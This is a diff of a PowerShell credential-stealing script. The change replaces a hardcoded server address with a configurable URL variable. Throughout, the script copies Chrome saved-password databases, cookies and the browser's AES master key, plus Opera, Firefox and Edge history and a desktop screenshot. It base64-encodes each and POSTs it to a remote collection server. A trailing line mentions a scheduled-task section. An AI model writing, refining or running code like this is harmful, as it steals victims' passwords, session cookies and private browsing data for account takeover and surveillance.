@@ -1,4 +1,4 @@
-
+$masterurl = "https://hello-flask-poetry-wandering-brook-7760.fly.dev"
 
 Add-Type -AssemblyName System.Security
 Add-Type -AssemblyName System.Windows.Forms
@@ -28,22 +28,22 @@ For ($i = 0; $i -lt $users.Length; $i++) {
     write-output "history"
     Copy-Item "$($env:USERPROFILE)\AppData\Local\Google\Chrome\User Data\$($users[$i])\History" "$($env:USERPROFILE)\out.f"
     $base64string1 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$($env:USERPROFILE)\out.f"))
-    Invoke-WebRequest -Uri http://lucasz228.us.to:50000/saveHistory -Method POST -Body @{text = $base64string1; name = $users[$i]; username = $Env:UserName; ComputerName = $Env:ComputerName }
+    Invoke-WebRequest -Uri "$($masterurl)/saveHistory" -Method POST -Body @{text = $base64string1; name = $users[$i]; username = $Env:UserName; ComputerName = $Env:ComputerName }
     write-output "passwords"
     Copy-Item "$($env:USERPROFILE)\AppData\Local\Google\Chrome\User Data\$($users[$i])\Login Data" "$($env:USERPROFILE)\out2.f"
     $base64string2 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$($env:USERPROFILE)\out2.f"))
-    Invoke-WebRequest -Uri http://lucasz228.us.to:50000/saveSavedPasswords -Method POST -Body @{db = $base64string2; masterKey = Get-Content "$($env:USERPROFILE)\out5.txt" -Raw; name = $users[$i]; username = $Env:UserName; ComputerName = $Env:ComputerName }
+    Invoke-WebRequest -Uri "$($masterurl)/saveSavedPasswords" -Method POST -Body @{db = $base64string2; masterKey = Get-Content "$($env:USERPROFILE)\out5.txt" -Raw; name = $users[$i]; username = $Env:UserName; ComputerName = $Env:ComputerName }
     if (Test-Path "$($env:USERPROFILE)\AppData\Local\Google\Chrome\User Data\$($users[$i])\Cookies") {
         write-output "cookies"
         Copy-Item "$($env:USERPROFILE)\AppData\Local\Google\Chrome\User Data\$($users[$i])\Cookies" "$($env:USERPROFILE)\out4.f"
         $base64string5 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$($env:USERPROFILE)\out4.f"))
-        Invoke-WebRequest -Uri http://lucasz228.us.to:50000/saveCookie -Method POST -Body @{text = $base64string5; name = $users[$i]; username = $Env:UserName; ComputerName = $Env:ComputerName }
+        Invoke-WebRequest -Uri "$($masterurl)/saveCookie" -Method POST -Body @{text = $base64string5; name = $users[$i]; username = $Env:UserName; ComputerName = $Env:ComputerName }
     }
     Remove-Item "$($env:USERPROFILE)\out.f"
     Remove-Item "$($env:USERPROFILE)\out2.f"
     Remove-Item "$($env:USERPROFILE)\out4.f"
 }
-Invoke-WebRequest -Uri http://lucasz228.us.to:50000/saveAesKey -Method POST -Body @{masterKey = Get-Content "$($env:USERPROFILE)\out5.txt" -Raw; name = "chrome"; username = $Env:UserName; ComputerName = $Env:ComputerName }
+Invoke-WebRequest -Uri "$($masterurl)/saveAesKey" -Method POST -Body @{masterKey = Get-Content "$($env:USERPROFILE)\out5.txt" -Raw; name = "chrome"; username = $Env:UserName; ComputerName = $Env:ComputerName }
 Remove-Item "$($env:USERPROFILE)\out3.txt"
 Remove-Item "$($env:USERPROFILE)\out3.f"
 Remove-Item "$($env:USERPROFILE)\out5.txt"
@@ -55,7 +55,7 @@ Write-Output "chrome end"
 write-output "opera start"
 Copy-Item "$($env:USERPROFILE)\AppData\Roaming\Opera Software\Opera Stable\Default\History" "$($env:USERPROFILE)\out.f"
 $base64string1 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$($env:USERPROFILE)\out.f"))
-Invoke-WebRequest -Uri http://lucasz228.us.to:50000/saveOperaHistory -Method POST -Body @{text = $base64string1; name = "Default"; username = $Env:UserName; ComputerName = $Env:ComputerName }
+Invoke-WebRequest -Uri "$($masterurl)/saveOperaHistory" -Method POST -Body @{text = $base64string1; name = "Default"; username = $Env:UserName; ComputerName = $Env:ComputerName }
 Remove-Item "$($env:USERPROFILE)\out.f"
 write-output "opera end"
 # OPERA end
@@ -67,7 +67,7 @@ Get-ChildItem "$($env:USERPROFILE)\AppData\Roaming\Mozilla\Firefox\Profiles" | F
     if (Test-Path "$($pathh)\places.sqlite") {
         Copy-Item "$($pathh)\places.sqlite" "$($env:USERPROFILE)\out.f"
         $base64string1 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$($env:USERPROFILE)\out.f"))
-        Invoke-WebRequest -Uri http://lucasz228.us.to:50000/saveFirefoxHistory -Method POST -Body @{text = $base64string1; name = $_.Name; username = $Env:UserName; ComputerName = $Env:ComputerName }
+        Invoke-WebRequest -Uri "$($masterurl)/saveFirefoxHistory" -Method POST -Body @{text = $base64string1; name = $_.Name; username = $Env:UserName; ComputerName = $Env:ComputerName }
         Remove-Item "$($env:USERPROFILE)\out.f"
     }
 }
@@ -78,7 +78,7 @@ write-output "firefox end"
 write-output "edge start"
 Copy-Item "$($env:USERPROFILE)\AppData\Local\Microsoft\Edge\User Data\Default\History" "$($env:USERPROFILE)\out.f"
 $base64string1 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$($env:USERPROFILE)\out.f"))
-Invoke-WebRequest -Uri http://lucasz228.us.to:50000/saveEdgeHistory -Method POST -Body @{text = $base64string1; name = "Default"; username = $Env:UserName; ComputerName = $Env:ComputerName }
+Invoke-WebRequest -Uri "$($masterurl)/saveEdgeHistory" -Method POST -Body @{text = $base64string1; name = "Default"; username = $Env:UserName; ComputerName = $Env:ComputerName }
 Remove-Item "$($env:USERPROFILE)\out.f"
 write-output "edge end"
 # EDGE end
@@ -94,7 +94,7 @@ $base64 = [Convert]::ToBase64String($stream.ToArray())
 $stream.Close()
 $graphic.Dispose()
 $bitmap.Dispose()
-Invoke-WebRequest -Uri http://lucasz228.us.to:50000/saveScreenshot -Method POST -Body @{data = $base64; username = $Env:UserName; ComputerName = $Env:ComputerName } 
+Invoke-WebRequest -Uri "$($masterurl)/saveScreenshot" -Method POST -Body @{data = $base64; username = $Env:UserName; ComputerName = $Env:ComputerName } 
 # SCREENSHOT end
 
 # Scheduled Tasks adder start
